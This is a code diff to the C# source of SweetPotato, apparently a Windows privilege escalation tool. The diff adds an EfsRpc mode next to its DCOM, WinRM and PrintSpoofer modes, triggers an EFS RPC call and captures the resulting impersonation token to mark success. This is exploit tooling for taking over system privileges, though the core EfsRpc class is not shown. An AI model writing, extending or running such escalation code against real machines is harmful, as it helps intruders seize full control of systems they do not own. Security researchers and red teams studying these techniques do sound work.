@@ -1,5 +1,4 @@
-﻿using rpc_12345678_1234_abcd_ef00_0123456789ab_1_0;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Net;
 using System.Net.Sockets;
@@ -20,6 +19,7 @@ namespace SweetPotato {
         Thread comListener;
         Thread winRMListener;
         PrintSpoofer printSpoofer;
+        EfsRpc efsRpc;
         LocalNegotiator negotiator = new LocalNegotiator();
         Guid clsId;
         readonly int port;
@@ -29,6 +29,7 @@ namespace SweetPotato {
         public enum Mode {
             DCOM,
             WinRM,
+            EfsRpc,
             PrintSpoofer
         }
 
@@ -36,9 +37,11 @@ namespace SweetPotato {
             get {
                 if (mode == Mode.DCOM || mode == Mode.WinRM) {
                     return negotiator.Token;
+                } else if (mode == Mode.EfsRpc) {
+                    return efsRpc.Token;
                 } else {
                     return printSpoofer.Token;
-                }
+                }   
             }
         }
 
@@ -56,6 +59,9 @@ namespace SweetPotato {
                     break;
                 case Mode.WinRM:
                     StartWinRMThread();
+                    break;
+                case Mode.EfsRpc:
+                    efsRpc = new EfsRpc();
                     break;
                 case Mode.PrintSpoofer:
                     printSpoofer = new PrintSpoofer();
@@ -235,6 +241,14 @@ namespace SweetPotato {
                         Type comType = Type.GetTypeFromCLSID(clsId);
                         var instance = Activator.CreateInstance(comType);
                         result = negotiator.Authenticated;
+                        break;
+
+                    case Mode.EfsRpc:
+
+                        efsRpc.TriggerEfsRpc();
+                        if(efsRpc.Token != IntPtr.Zero) {
+                            result = true;
+                        }
                         break;
 
                     case Mode.PrintSpoofer:
